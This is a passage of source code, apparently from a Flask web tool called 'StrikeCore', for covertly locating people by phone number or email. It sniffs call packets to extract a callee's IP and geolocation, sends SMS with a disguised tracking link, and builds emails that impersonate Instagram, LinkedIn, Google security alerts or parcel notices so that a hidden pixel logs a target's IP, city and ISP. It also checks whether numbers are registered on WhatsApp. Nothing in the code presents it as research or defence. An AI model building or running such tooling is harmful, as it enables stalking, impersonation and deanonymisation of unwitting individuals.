        statusEl.textContent='sniffing...';statusEl.style.color='#f44';
        startPoll(label);return;
      }
      clearLog();log('Chiamata '+method.toUpperCase()+' verso '+num+'...');
      statusEl.textContent='calling...';statusEl.style.color='#ff0';
      fetch('/api/gateway/call',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({number:num,method:method})
      }).then(function(r){return r.json();}).then(function(d){
        if(d.error){log('ERRORE: '+d.error,'log-err');statusEl.textContent='errore';statusEl.style.color='#f44';}
        else{
          log('Chiamata avviata','log-ok');
          if(d.pcap)log('PCAP: '+d.pcap,'log-dim');
          if(d.call_sid)log('SID: '+d.call_sid,'log-dim');
          if(d.method==='asterisk_native'){
            log('Analisi PCAP in corso...','log-ok');
            statusEl.textContent='in call + sniffing';statusEl.style.color='#0f0';
            startPoll(num.replace(/[^0-9]/g,''));
          }else{statusEl.textContent=d.status||'initiated';statusEl.style.color='#0f0';}
        }
      }).catch(function(){log('Errore di rete','log-err');statusEl.textContent='errore';statusEl.style.color='#f44';});
    }

    function doHangup(){
      fetch('/api/gateway/call',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({action:'hangup'})
      }).then(function(r){return r.json();}).then(function(d){
        log('Chiamate terminate','log-ok');statusEl.textContent='idle';statusEl.style.color='#666';
      }).catch(function(){});
      if(pollTimer)clearInterval(pollTimer);
    }

    function showResult(r){
      var panel=document.getElementById('ip-result');
      panel.style.display='block';
      document.getElementById('res-ip').textContent=r.ip;
      document.getElementById('res-isp').textContent=(r.isp||'')+(r.org?' / '+r.org:'');
      document.getElementById('res-asn').textContent=r.as||'';
      document.getElementById('res-city').textContent=(r.city||'?')+', '+(r.region||'')+', '+(r.country||'');
      document.getElementById('res-addr').textContent=r.address||'';
      document.getElementById('res-coords').textContent=r.lat?r.lat.toFixed(6)+', '+r.lon.toFixed(6):'';
      document.getElementById('res-score').textContent='Score: '+r.score;
      document.getElementById('res-packets').textContent='Pacchetti: '+(r.packets||'?')+' | STUN: '+(r.stun||0);
      document.getElementById('res-tz').textContent=r.timezone||'';
      // Flags
      var flags='';
      if(r.mobile)flags+='<span class="badge bg-blue-500/20 text-blue-400">MOBILE</span> ';
      if(r.proxy)flags+='<span class="badge bg-red-500/20 text-red-400">PROXY</span> ';
      if(r.hosting)flags+='<span class="badge bg-yellow-500/20 text-yellow-400">HOSTING</span> ';
      if(!r.mobile&&!r.proxy&&!r.hosting)flags+='<span class="badge bg-gray-500/20 text-gray-400">RESIDENTIAL</span>';
      document.getElementById('ip-result-flags').innerHTML=flags;
      // Add to map
      if(r.lat&&r.lon&&geoMap){
        var color=r.mobile?'#3b82f6':'#10b981';
        L.circleMarker([r.lat,r.lon],{radius:9,fillColor:color,color:'#fff',weight:2,fillOpacity:0.8})
          .addTo(geoMap).bindPopup('<b style="color:'+color+'">'+r.ip+'</b><br>'+(r.city||'')+', '+(r.country||'')+'<br>'+(r.isp||'')+'<br>'+(r.mobile?'<b style="color:#3b82f6">MOBILE</b>':'FIXED'));
        geoMap.setView([r.lat,r.lon],8);
      }
      // Add row to results table
      var tbody=document.querySelector('#call-results-table tbody');
      if(tbody){
        var tr=document.createElement('tr');
        tr.className='table-row border-b border-white/5 text-[11px]';
        var mob=r.mobile?' <span class="text-blue-400">[M]</span>':'';
        tr.innerHTML='<td class="py-2 px-3 text-gray-500">'+new Date().toLocaleString('it-IT',{day:'2-digit',month:'2-digit',hour:'2-digit',minute:'2-digit'})+'</td>'
          +'<td class="py-2 px-3 text-cyan-400">'+(r.tracker_label||'?')+'</td>'
          +'<td class="py-2 px-3 text-green-400 font-mono">'+r.ip+'</td>'
          +'<td class="py-2 px-3">'+r.score+mob+'</td>'
          +'<td class="py-2 px-3 text-gray-400">'+(r.city||'?')+', '+(r.country||'?')+'</td>'
          +'<td class="py-2 px-3 text-gray-600 text-[10px]">'+(r.isp||'')+'</td>';
        tbody.insertBefore(tr,tbody.firstChild);
      }
    }

    function startPoll(label){
      if(pollTimer)clearInterval(pollTimer);
      var checks=0;
      pollTimer=setInterval(function(){
        checks++;
        fetch('/api/gateway/live?label='+label).then(function(r){return r.json();}).then(function(d){
          if(d.found){
            clearInterval(pollTimer);
            var r=d.result;
            log('IP TROVATO: '+r.ip,'log-ok');
            log((r.city||'')+', '+(r.country||'')+' | '+(r.isp||''),'log-ok');
            if(r.mobile)log('RETE MOBILE','log-ok');
            if(r.address)log(r.address,'log-dim');
            statusEl.textContent='IP: '+r.ip;statusEl.style.color='#0ff';
            r.tracker_label=label;
            showResult(r);
          }else{
            if(d.pcap_size)log('Analisi... '+Math.round(d.pcap_size/1024)+'KB ('+checks+')','log-dim');
            else if(checks%5===0)log('In attesa risultato... ('+checks+')','log-dim');
          }
          if(d.channels!==undefined&&d.channels>0)statusEl.textContent='in call ('+d.channels+' ch)';
        }).catch(function(){});
        if(checks>120){clearInterval(pollTimer);log('Timeout','log-err');}
      },3000);
    }

    function sniffCall(number,target){dialEl.value=number;document.querySelector('input[name="cm"][value="sniffer"]').checked=true;doCall();}
    function filterRb(q){q=q.toLowerCase();document.querySelectorAll('#rb-table tbody tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().indexOf(q)!==-1?'':'none';});}

    // Init map
    (function(){try{
      geoMap=L.map('geomap').setView([41.9,12.5],5);
      L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',{maxZoom:19}).addTo(geoMap);
      var pts=""" + geo_json + """;
      var bounds=[];
      pts.forEach(function(p){
        var color=p.color||'#10b981';
        L.circleMarker([p.lat,p.lon],{radius:7,fillColor:color,color:'#fff',weight:1.5,fillOpacity:0.7})
          .addTo(geoMap).bindPopup('<b style="color:'+color+'">'+p.label+'</b><br><code>'+p.ip+'</code><br>'+p.city+', '+p.country+'<br>'+(p.source||''));
        bounds.push([p.lat,p.lon]);
      });
      if(bounds.length)geoMap.fitBounds(bounds,{padding:[30,30]});
    }catch(e){console.error('Map init error:',e);}})();
    </script>
    """

    return _render("Gateway Telefonico", content, "voip")
@app.route('/api/gateway/call', methods=['POST'])
def api_gateway_call():
    """Initiate or hangup calls."""
    data = request.get_json() or {}
    if data.get("action") == "hangup":
        try:
            subprocess.run(["sudo", "asterisk", "-rx", "channel request hangup all"],
                           capture_output=True, text=True, timeout=5)
            return jsonify({"status": "hangup_ok"})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    number = data.get("number", "")
    method = data.get("method", "asterisk")
    if not number:
        return jsonify({"error": "Numero mancante"}), 400

    if method == "twilio":
        try:
            sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent / "voip" / "scripts"))
            from twilio_bridge import make_call
            call = make_call(number)
            if call:
                return jsonify({"call_sid": call.sid, "status": call.status, "number": number})
            return jsonify({"error": "Twilio non configurato"}), 500
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    elif method == "asterisk":
        try:
            # Normalize to E.164
            num_clean = re.sub(r"[\s\-\.\(\)]", "", number)
            if num_clean.startswith("+"):
                e164 = num_clean
            elif num_clean.startswith("00"):
                e164 = "+" + num_clean[2:]
            elif num_clean.startswith("0") and len(num_clean) >= 6:
                e164 = "+39" + num_clean[1:]
            elif num_clean.startswith("3") and len(num_clean) >= 9 and len(num_clean) <= 10:
                e164 = "+39" + num_clean
            elif num_clean.startswith("1") and len(num_clean) == 11:
                e164 = "+" + num_clean
            else:
                e164 = "+" + num_clean
            label = re.sub(r"[^0-9]", "", number)
            pcap_dir = Path.home() / "strikecore-data" / "ip_logs"
            pcap_dir.mkdir(parents=True, exist_ok=True)
            ts = int(time.time())
            pcap_tmp = f"/tmp/sc_capture_{label}_{ts}.pcap"
            pcap_file = str(pcap_dir / f"{label}_{ts}.pcap")
            try:
                pcap_proc = subprocess.Popen(["sudo", "tshark", "-i", "any", "-f",
                     "udp and portrange 10000-65535",
                     "-a", "duration:90", "-w", pcap_tmp],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                # Background thread: wait for tshark, then process PCAP
                import threading
                def _process_after_capture(proc, pcap_path, num, lbl):
                    try:
                        proc.wait(timeout=120)
                        # Fix ownership so we can read the pcap
                        # Move pcap from /tmp to final location
                        tmp_path = pcap_path.replace(str(Path.home() / "strikecore-data" / "ip_logs"), "/tmp").replace("ip_logs/", "sc_capture_")
                        import shutil
                        # Try direct: /tmp/sc_capture_LABEL_TS.pcap
                        import glob as _glob
                        candidates = _glob.glob(f"/tmp/sc_capture_{lbl}_*.pcap")
                        if candidates:
                            tmp_path = max(candidates, key=lambda x: Path(x).stat().st_mtime)
                        subprocess.run(["sudo", "chown", "atlas:atlas", tmp_path],
                                       capture_output=True, timeout=5)
                        if Path(tmp_path).exists():
                            shutil.move(tmp_path, pcap_path)
                        # Run process_pcap.py
                        voip_scripts = str(Path(__file__).resolve().parent.parent.parent / "voip" / "scripts" / "process_pcap.py")
                        subprocess.run([sys.executable, voip_scripts, pcap_path, num],
                                       capture_output=True, timeout=60)
                        # process_pcap.py v2 already saves _call.json and _voip.json
                        # with correct scoring (mobile > fixed, WG noise penalized)
                        pass
                    except Exception:
                        pass
                threading.Thread(target=_process_after_capture, args=(pcap_proc, pcap_file, e164, label), daemon=True).start()
            except Exception:
                pcap_file = None
            r = subprocess.run(["sudo", "asterisk", "-rx",
                 f"channel originate Local/{e164}@outbound-twilio application Wait 120"],
                capture_output=True, text=True, timeout=15)
            if r.returncode == 0:
                return jsonify({"status": "initiated", "number": e164,
                    "method": "asterisk_native", "pcap": pcap_file,
                    "output": r.stdout.strip()[:200]})
            return jsonify({"error": r.stderr.strip() or r.stdout.strip() or "Asterisk error"}), 500
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    elif method == "whatsapp":
        try:
            sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent / "voip" / "scripts"))
            from twilio_bridge import make_call
            call = make_call(number, tts_message="", label=f"wa_{number.replace('+','')}")
            if call:
                return jsonify({"call_sid": call.sid, "status": call.status, "number": number, "method": "whatsapp"})
            return jsonify({"error": "Twilio/WhatsApp non configurato"}), 500
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    return jsonify({"error": f"Metodo '{method}' non supportato"}), 400



def _send_tracking_sms(to_number, label=""):
    """Send SMS with disguised tracking link."""
    from core.ip_logger import generate_tracking_id, LOG_DIR
    try:
        env_file = Path.home() / ".strikecore" / "twilio.env"
        creds = {}
        if env_file.exists():
            for line in env_file.read_text().strip().split("\n"):
                if "=" in line and not line.startswith("#"):
                    k, v = line.split("=", 1)
                    creds[k.strip()] = v.strip()
        if not creds.get("TWILIO_SID"):
            return None
        from twilio.rest import Client
        client = Client(creds["TWILIO_SID"], creds["TWILIO_TOKEN"])
        tid = generate_tracking_id(label or to_number.replace("+", ""))
        tunnel = _tunnel_status()
        base = tunnel.get("url", "") if tunnel.get("running") and tunnel.get("url") else "http://10.0.0.1:5000"
        meta = {"label": label or to_number, "destination": "https://maps.google.com",
                "created": datetime.now().isoformat(), "source": "gateway_sms"}
        (LOG_DIR / f"{tid}_meta.json").write_text(json.dumps(meta))
        track_url = f"{base}/gl/{tid}"
        msg = client.messages.create(to=to_number, from_=creds.get("TWILIO_FROM", ""),
            body=f"Ti ho condiviso una posizione: {track_url}")
        return {"sms_sid": msg.sid, "tracking_id": tid, "tracking_url": track_url}
    except Exception as e:
        return {"error": str(e)}


@app.route('/api/gateway/sms', methods=['POST'])
def api_gateway_sms():
    """Send tracking SMS."""
    data = request.get_json() or {}
    number = data.get("number", "")
    if not number:
        return jsonify({"error": "Numero mancante"}), 400
    result = _send_tracking_sms(number, data.get("label", ""))
    if not result:
        return jsonify({"error": "Twilio non configurato"}), 500
    return jsonify(result)


@app.route('/api/gateway/live')
def api_gateway_live():
    """Poll for live call sniffer results and channel status."""
    label = request.args.get("label", "")
    from core.ip_logger import LOG_DIR as IP_LOG_DIR
    result = {"found": False}
    try:
        r = subprocess.run(["sudo", "asterisk", "-rx", "core show channels count"],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.split("\n"):
            if "active channel" in line:
                m = re.search(r"(\d+)", line)
                if m: result["channels"] = int(m.group(1))
    except Exception:
        pass
    if label:
        call_file = IP_LOG_DIR / f"{label}_call.json"
        voip_file = IP_LOG_DIR / f"{label}_voip.json"
        # Also check with country prefix variations (3272270038 vs 393272270038)
        e164_label = "39" + label if not label.startswith("39") and len(label) == 10 else label
        call_file_e = IP_LOG_DIR / f"{e164_label}_call.json"
        voip_file_e = IP_LOG_DIR / f"{e164_label}_voip.json"
        # Also check plain hit log (393272270038.json)
        hit_file = IP_LOG_DIR / f"{label}.json"
        hit_file_e = IP_LOG_DIR / f"{e164_label}.json"
        # Find first existing
        check_file = None
        for f in [call_file, voip_file, call_file_e, voip_file_e]:
            if f.exists():
                check_file = f
                break
        # Fallback: check hit log format ({label}.json with array of hits)
        if not check_file:
            for hf in [hit_file, hit_file_e]:
                if hf.exists():
                    try:
                        hits = json.loads(hf.read_text())
                        if isinstance(hits, list) and hits:
                            h = hits[-1]
                            geo = h.get("geo", {})
                            if geo.get("lat"):
                                return jsonify({"found": True, "channels": result.get("channels", 0),
                                    "result": {"ip": h.get("ip",""), "score": 50,
                                        "stun": 0, "city": geo.get("city",""),
                                        "country": geo.get("country",""), "isp": geo.get("isp",""),
                                        "address": geo.get("address","")[:100],
                                        "lat": geo.get("lat",0), "lon": geo.get("lon",0),
                                        "region": geo.get("region",""), "zip": geo.get("zip",""),
                                        "hostname": geo.get("hostname",""), "as": geo.get("as",""),
                                        "org": geo.get("org",""), "mobile": geo.get("mobile",False),
                                        "proxy": geo.get("proxy",False), "timezone": geo.get("timezone",""),
                                        "tracker_label": label,
                                        "tracker_label_e164": "39" + label if not label.startswith("39") and len(label) == 10 else label}})
                    except Exception:
                        pass
        if check_file:
            try:
                data = json.loads(check_file.read_text())
                # Handle voip format — use all_candidates if available (v2 parser)
                if data.get("type") == "voip_call_capture":
                    cands = data.get("all_candidates", [])
                    if cands and cands[0].get("score"):
                        # v2 format: candidates already scored with mobile priority
                        best = cands[0]
                        geo = data.get("geo", {})
                        data = {"results": [{"ip": best.get("ip",""), "score": best.get("score",50), "stun": 0, "geo": geo}]}
                    else:
                        # Legacy format: fallback
                        geo = data.get("geo", {})
                        data = {"results": [{"ip": data.get("top_ip",""), "score": 50, "stun": 0, "geo": geo}]}
                top = data.get("results", [{}])[0] if data.get("results") else {}
                if top.get("ip") and top.get("score", 0) > 10:
                    geo = top.get("geo", {})
                    result["found"] = True
                    result["result"] = {
                        "ip": top["ip"], "score": top.get("score", 0),
                        "stun": top.get("stun", 0), "city": geo.get("city", ""),
                        "country": geo.get("country", ""), "isp": geo.get("isp", ""),
                        "address": geo.get("address", "")[:100],
                        "lat": geo.get("lat", 0), "lon": geo.get("lon", 0),
                        "region": geo.get("region", ""),
                        "zip": geo.get("zip", ""),
                        "hostname": geo.get("hostname", ""),
                        "as": geo.get("as", ""),
                        "org": geo.get("org", ""),
                        "mobile": geo.get("mobile", False),
                        "proxy": geo.get("proxy", False),
                        "hosting": geo.get("hosting", False),
                        "timezone": geo.get("timezone", ""),
                        "packets": top.get("packets", 0),
                        "tracker_label": label if not label.startswith("39") else label,
                        "tracker_label_e164": "39" + label if not label.startswith("39") and len(label) == 10 else label,
                    }
            except Exception:
                pass
    # Report pcap size for progress indication
    if label:
        import glob as _g
        pcaps = _g.glob(f"/tmp/sc_capture_{label}_*.pcap")
        if not pcaps:
            e_label = "39" + label if not label.startswith("39") and len(label) == 10 else label
            pcaps = _g.glob(f"/tmp/sc_capture_{e_label}_*.pcap")
        if pcaps:
            try:
                result["pcap_size"] = Path(max(pcaps, key=lambda x: Path(x).stat().st_mtime)).stat().st_size
            except Exception:
                pass
    return jsonify(result)


@app.route('/api/gateway/wa-check', methods=['POST'])
def api_gateway_wa_check():
    """Check if a phone number is registered on WhatsApp."""
    data = request.get_json() or {}
    number = data.get("number", "").strip()
    if not number:
        return jsonify({"error": "Numero mancante"}), 400

    # Use wa-check wrapper (from StrikeCore tools)
    try:
        r = subprocess.run(
            ["wa-check", number],
            capture_output=True, text=True, timeout=15,
        )
        output = r.stdout.lower() + r.stderr.lower()
        registered = "registered" in output or "exists" in output or "true" in output
        return jsonify({"number": number, "registered": registered, "raw": r.stdout.strip()[:200]})
    except FileNotFoundError:
        return jsonify({"error": "wa-check non trovato", "number": number}), 500
    except subprocess.TimeoutExpired:
        return jsonify({"error": "timeout", "number": number}), 500
    except Exception as e:
        return jsonify({"error": str(e), "number": number}), 500


@app.route('/api/gateway/phonebook')
def api_gateway_phonebook():
    """Return the auto-populated phonebook as JSON."""
    phones = _gather_phonebook()
    return jsonify({"count": len(phones), "phones": phones})


@app.route('/api/gateway/status')
def api_gateway_status():
    """Return gateway component status."""
    pbx_running = False
    pbx_version = ""
    try:
        r = subprocess.run(["sudo", "asterisk", "-rx", "core show version"],
                           capture_output=True, text=True, timeout=5)
        pbx_running = r.returncode == 0 and "Asterisk" in r.stdout
        pbx_version = r.stdout.strip()[:60] if pbx_running else ""
    except Exception:
        pass
    # Check PJSIP trunk
    trunk_status = "unknown"
    try:
        r = subprocess.run(["sudo", "asterisk", "-rx", "pjsip show endpoint twilio"],
                           capture_output=True, text=True, timeout=5)
        if "twilio" in r.stdout.lower():
            trunk_status = "configured"
    except Exception:
        pass

    twilio_ok = (Path.home() / ".strikecore" / "twilio.env").exists()
    tunnel = _tunnel_status()

    return jsonify({
        "asterisk": {"running": pbx_running, "version": pbx_version, "trunk": trunk_status},
        "twilio": {"configured": twilio_ok},
        "tunnel": {"running": tunnel.get("running", False), "url": tunnel.get("url", "")},
        "phonebook_count": len(_gather_phonebook()),
        "call_results_count": len(_gather_call_results()),
    })


# ══════════════════════════════════════════════════════════════
# Email Tracker — Zero-click via email open tracking pixel
# ══════════════════════════════════════════════════════════════

@app.route('/email-tracker')
def email_tracker_page():
    """Generate tracking emails with embedded pixel."""
    from core.ip_logger import list_trackers
    ts = _tunnel_status()
    turl = ts.get("url", "")
    base = turl if turl else "http://" + request.host

    trackers = list_trackers()
    email_trackers = [t for t in trackers if any("email" in s or "pixel" in s for s in (str(t.get("ips",[])),))] or trackers[:5]

    content_html = '<h1 class="text-xl font-bold text-white mb-6">Email Tracker (Zero-Click)</h1>'
    content_html += '<div class="glass-bright p-4 mb-4"><p class="text-xs text-gray-400">Email tracking is the most reliable zero-click method. When the target opens the email, the tracking pixel loads automatically from our server. Works on Gmail, Outlook, Apple Mail.</p></div>'

    content_html += '<div class="glass-bright p-5 mb-6" x-data="{email:\'\',subject:\'\',template:\'instagram_notification\',tid:\'\',preview:\'\',saved:\'\'}">'
    content_html += '<h2 class="text-sm font-semibold text-red-400 mb-3">Generate Tracking Email</h2>'

    # Template selector
    content_html += '<div class="grid grid-cols-5 gap-2 mb-3">'
    templates = [
        ("instagram_notification", "Instagram Tag", "pink"),
        ("linkedin_connection", "LinkedIn Connect", "blue"),
        ("google_security", "Google Security", "cyan"),
        ("delivery_notification", "Package Delivery", "yellow"),
        ("plain_pixel", "Plain Text", "gray"),
    ]
    for tpl_id, tpl_name, tpl_color in templates:
        content_html += "<button @click=\"template='" + tpl_id + "'\" :class=\"template=='" + tpl_id + "' ? 'border-" + tpl_color + "-400' : 'border-white/10'\" class=\"text-[10px] px-3 py-2 rounded-lg bg-black/30 border text-" + tpl_color + "-400 hover:bg-white/5\">" + tpl_name + "</button>"
    content_html += '</div>'

    # Email input
    content_html += '<div class="grid grid-cols-2 gap-2 mb-3">'
    content_html += '<input x-model="email" type="email" placeholder="target@gmail.com" class="bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-xs text-white placeholder-gray-600 focus:outline-none">'
    content_html += '<input x-model="subject" type="text" placeholder="Subject (auto-filled per template)" class="bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-xs text-white placeholder-gray-600 focus:outline-none">'
    content_html += '</div>'

    content_html += """<div class="flex gap-2 mb-3">
      <button @click="fetch('/api/email-tracker/generate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:email,subject:subject,template:template})}).then(r=>r.json()).then(d=>{tid=d.tracking_id;preview=d.preview_url;saved=d.saved_path;window.open('/tracking/'+tid,'_blank')})" class="px-4 py-2 bg-red-500/20 border border-red-500/30 rounded-lg text-red-400 text-xs">Generate & Monitor</button>
      <button x-show="preview" @click="window.open(preview,'_blank')" class="px-4 py-2 bg-cyan-500/20 border border-cyan-500/30 rounded-lg text-cyan-400 text-xs">Preview Email</button>
      <button x-show="saved" @click="window.open('/api/email-tracker/download/'+tid,'_blank')" class="px-4 py-2 bg-green-500/20 border border-green-500/30 rounded-lg text-green-400 text-xs">Download HTML</button>
    </div>"""

    content_html += '<div x-show="tid" class="bg-black/40 rounded-lg p-4 text-[11px] space-y-2">'
    content_html += '<div>Tracker ID: <code class="text-white" x-text="tid"></code></div>'
    content_html += '<div class="text-green-400">Email HTML generated and saved. Send it to the target.</div>'
    content_html += '<div class="text-gray-500">When the target opens the email, their IP is logged automatically (zero-click).</div>'
    content_html += '<div>Monitor: <a class="text-cyan-400" :href="\'/tracking/\'+tid" x-text="\'/tracking/\'+tid" target="_blank"></a></div>'
    content_html += '</div></div>'

    # How it works
    content_html += '<div class="glass-bright p-4 mb-4">'
    content_html += '<h2 class="text-sm font-semibold text-cyan-400 mb-2">How Zero-Click Email Tracking Works</h2>'
    content_html += '<div class="grid grid-cols-4 gap-3 text-[10px]">'
    content_html += '<div class="glass p-3"><div class="text-green-400 font-bold mb-1">1. Generate</div><div class="text-gray-500">Choose template, enter target email, generate HTML</div></div>'
    content_html += '<div class="glass p-3"><div class="text-blue-400 font-bold mb-1">2. Send</div><div class="text-gray-500">Send the HTML email to target (via your email client or SMTP)</div></div>'
    content_html += '<div class="glass p-3"><div class="text-yellow-400 font-bold mb-1">3. Target Opens</div><div class="text-gray-500">Email client loads the invisible 1x1 pixel from our server</div></div>'
    content_html += '<div class="glass p-3"><div class="text-red-400 font-bold mb-1">4. IP Logged</div><div class="text-gray-500">Real IP + device + city + ISP captured automatically</div></div>'
    content_html += '</div></div>'

    # Channel comparison
    content_html += '<div class="glass-bright p-4">'
    content_html += '<h2 class="text-sm font-semibold text-yellow-400 mb-2">Zero-Click Channel Comparison</h2>'
    content_html += '<table class="w-full text-[10px]"><thead><tr class="text-gray-500 border-b border-white/10"><th class="text-left py-1 px-2">Channel</th><th class="py-1 px-2">Zero-Click</th><th class="py-1 px-2">Click Required</th><th class="text-left py-1 px-2">Notes</th></tr></thead><tbody>'
    content_html += '<tr class="border-b border-white/5"><td class="py-1 px-2 text-green-400">Email</td><td class="py-1 px-2 text-center text-green-400">YES</td><td class="py-1 px-2 text-center">Also</td><td class="py-1 px-2 text-gray-500">Most reliable. Gmail/Apple Mail auto-load images.</td></tr>'
    content_html += '<tr class="border-b border-white/5"><td class="py-1 px-2 text-green-400">WhatsApp</td><td class="py-1 px-2 text-center text-green-400">YES</td><td class="py-1 px-2 text-center">Also</td><td class="py-1 px-2 text-gray-500">Preview generated client-side on most devices.</td></tr>'
    content_html += '<tr class="border-b border-white/5"><td class="py-1 px-2 text-green-400">SMS/iMessage</td><td class="py-1 px-2 text-center text-green-400">YES</td><td class="py-1 px-2 text-center">Also</td><td class="py-1 px-2 text-gray-500">Apple devices auto-preview links.</td></tr>'
    content_html += '<tr class="border-b border-white/5"><td class="py-1 px-2 text-red-400">Instagram DM</td><td class="py-1 px-2 text-center text-red-400">NO</td><td class="py-1 px-2 text-center text-green-400">YES</td><td class="py-1 px-2 text-gray-500">Instagram proxies all resources. Click needed.</td></tr>'
    content_html += '<tr class="border-b border-white/5"><td class="py-1 px-2 text-yellow-400">Telegram</td><td class="py-1 px-2 text-center text-yellow-400">PARTIAL</td><td class="py-1 px-2 text-center text-green-400">YES</td><td class="py-1 px-2 text-gray-500">Server-side preview. Some client-side on mobile.</td></tr>'
    content_html += '</tbody></table></div>'

    return _render("Email Tracker", content_html, "email")


@app.route('/api/email-tracker/generate', methods=['POST'])
def api_generate_email_tracker():
    """Generate a tracking email HTML."""
    from core.email_tracker import generate_tracking_email, save_email_html
    from core.ip_logger import generate_tracking_id, LOG_DIR

    data = request.get_json() or {}
    email = data.get("email", "target@example.com")
    subject = data.get("subject", "")
    template = data.get("template", "instagram_notification")

    tid = generate_tracking_id(email)
    ts = _tunnel_status()
    base = ts.get("url") or ("http://" + request.host)

    # Default subjects per template
    default_subjects = {
        "instagram_notification": "You've been tagged in a photo",
        "linkedin_connection": "New connection request",
        "google_security": "Security alert for your account",
        "delivery_notification": "Your package is on its way",
        "plain_pixel": "Check this out",
    }
    if not subject:
        subject = default_subjects.get(template, "Notification")

    html = generate_tracking_email(tid, base, email, subject, template)
    saved = save_email_html(tid, html)

    # Save meta
    meta = {"label": f"email:{email}", "destination": email, "template": template, 
            "subject": subject, "created": datetime.now().isoformat()}
    (LOG_DIR / f"{tid}_meta.json").write_text(json.dumps(meta))

    return jsonify({
        "tracking_id": tid,
        "preview_url": f"/api/email-tracker/preview/{tid}",
        "saved_path": saved,
        "subject": subject,
        "template": template,
    })


@app.route('/api/email-tracker/preview/<tid>')
def api_email_preview(tid):
    """Preview the generated tracking email."""
    path = Path.home() / "strikecore-data" / "email_trackers" / f"{tid}.html"
    if path.exists():
        return Response(path.read_text(), mimetype="text/html")
    abort(404)


@app.route('/api/email-tracker/download/<tid>')
def api_email_download(tid):
    """Download the email HTML file."""
    path = Path.home() / "strikecore-data" / "email_trackers" / f"{tid}.html"
    if path.exists():
        return send_file(str(path), as_attachment=True, download_name=f"email_{tid}.html")
    abort(404)


# ══════════════════════════════════════════════════════════════
# Nuxt UI Frontend — Reverse proxy to internal Nuxt server
# ══════════════════════════════════════════════════════════════

import urllib.request as _urlreq

_NUXT_INTERNAL = 'http://127.0.0.1:3001'

def _proxy_nuxt(subpath):
    """Proxy request to internal Nuxt server."""
    try:
        url = f'{_NUXT_INTERNAL}/{subpath}'
        req = _urlreq.Request(url, headers={'User-Agent': 'StrikeCore-Proxy'})
        resp = _urlreq.urlopen(req, timeout=5)
        data = resp.read()
        ct = resp.headers.get('Content-Type', 'text/html')
        return Response(data, mimetype=ct)
    except Exception:
        abort(502)

@app.route('/ui/')
@app.route('/ui/<path:path>')
def nuxt_spa(path=''):
    """Serve Nuxt SPA pages."""
    return _proxy_nuxt(path)

@app.route('/_nuxt/<path:path>')
def nuxt_assets(path):
    """Proxy Nuxt static assets to internal Nuxt server."""
    return _proxy_nuxt(f'_nuxt/{path}')


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("FLASK_PORT", 5000)), debug=False)


